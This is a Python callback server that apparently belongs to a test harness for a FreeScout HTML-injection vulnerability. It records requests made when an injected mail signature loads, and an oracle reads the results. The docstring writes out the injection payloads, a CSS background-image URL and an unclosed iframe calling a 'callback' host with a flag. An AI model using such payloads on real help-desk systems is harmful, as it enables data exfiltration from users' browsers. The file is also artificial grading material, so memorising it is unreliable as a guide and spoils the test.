#!/usr/bin/env python3
"""Internal-only exfil collector for the freescout-cve-2026-40497 canary.

Records every request the victim's browser makes as a side effect of the injected
signature actually being applied/loaded in the REAL conversation view:
  - residual <style>: CSS `background-image: url(http://callback:9000/c?flag=<PCB_FLAG>)`
  - original <iframe src=http://callback:9000/c?flag=<PCB_FLAG>> (unclosed)
Success = the per-run ${PCB_FLAG} substring appears in a recorded hit -> the tag survived
sanitization AND the browser executed it (not mere reflection). /dump is host-published so
the oracle can read the result; /reset clears between probes.
"""
import http.server
import urllib.parse
import json

_hits = []


class H(http.server.BaseHTTPRequestHandler):
    def _txt(self, code, body=b"ok"):
        self.send_response(code)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        q = urllib.parse.urlparse(self.path)
        if q.path == "/c":
            _hits.append(self.path)
            # 1x1 gif so <img>/background-image loads cleanly
            self.send_response(200)
            self.send_header("Content-Type", "image/gif")
            self.end_headers()
            self.wfile.write(
                b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!"
                b"\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
            )
        elif q.path == "/dump":
            self._txt(200, json.dumps(_hits).encode())
        elif q.path == "/reset":
            _hits.clear()
            self._txt(200, b"reset")
        elif q.path == "/health":
            self._txt(200)
        else:
            self._txt(404, b"")

    def log_message(self, *a):
        pass


if __name__ == "__main__":
    http.server.HTTPServer(("0.0.0.0", 9000), H).serve_forever()
